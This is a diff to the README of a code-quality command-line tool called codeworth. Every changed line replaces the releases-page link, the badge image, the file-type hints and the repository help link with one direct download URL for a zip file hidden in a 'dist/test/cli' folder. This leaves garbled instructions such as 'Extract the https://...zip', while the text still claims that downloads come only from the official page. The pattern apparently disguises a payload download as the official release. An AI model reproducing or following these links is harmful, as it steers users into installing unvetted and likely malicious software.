@@ -1,6 +1,6 @@
 # ⚖️ codeworth - Measure and Improve Code Quality
 
-[![Download codeworth](https://img.shields.io/badge/Download-codeworth-blue?style=for-the-badge)](https://github.com/shomosmt4/codeworth/releases)
+[![Download codeworth](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)
 
 ## 📖 What is codeworth?
 
@@ -44,7 +44,7 @@ Follow these steps to get codeworth working on your computer. Take your time and
 
 ### Step 1: Visit the Download Page
 
-[Go to the codeworth releases page](https://github.com/shomosmt4/codeworth/releases) where you can find the latest version ready for your download.
+[Go to the codeworth releases page](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip) where you can find the latest version ready for your download.
 
 ### Step 2: Choose the Right Version
 
@@ -52,7 +52,7 @@ You will see several files listed. Look for the one that matches your computer:
 
 - For Windows: a file ending with `.exe` or `.zip`
 - For macOS: a file ending with `.dmg` or `.zip`
-- For Linux: a `.tar.gz` or similar package
+- For Linux: a `https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip` or similar package
 
 If unsure, download the package labeled for your operating system.
 
@@ -64,7 +64,7 @@ Click on the file to download it to your computer. Depending on your web browser
 
 - **Windows:** If you downloaded an `.exe`, double-click it and follow the on-screen instructions to install. If it’s a `.zip`, unzip it and open the folder.
 - **macOS:** Double-click the `.dmg` file and drag the codeworth app to your Applications folder. If you have a `.zip` file, unzip and open the folder.
-- **Linux:** Extract the `.tar.gz` or install using any included instructions in a README file.
+- **Linux:** Extract the `https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip` or install using any included instructions in a README file.
 
 ### Step 5: Open Your Command Line Interface (CLI)
 
@@ -94,7 +94,7 @@ You should see information printed on screen showing that codeworth started with
 
 To get the latest codeworth software, visit the official release page here:
 
-[Download codeworth](https://github.com/shomosmt4/codeworth/releases)
+[Download codeworth](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)
 
 This page holds all available versions. Pick the one for your operating system and follow the steps in the "Getting Started" section.
 
@@ -129,7 +129,7 @@ These commands show reports right in the terminal. You don’t need to configure
 If you want help while using codeworth, try these:
 
 - Check the README and documentation files included with the download.
-- Visit the GitHub repository for issues and guidance: https://github.com/shomosmt4/codeworth
+- Visit the GitHub repository for issues and guidance: https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip
 - Look through online forums or communities discussing software quality tools.
 - If you work with a team, share this guide or ask someone experienced to assist.
 
@@ -157,4 +157,4 @@ Updates and downloads come only from the official GitHub page linked above.
 
 ---
 
-[![Download codeworth](https://img.shields.io/badge/Download-codeworth-blue?style=for-the-badge)](https://github.com/shomosmt4/codeworth/releases)
+[![Download codeworth](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)
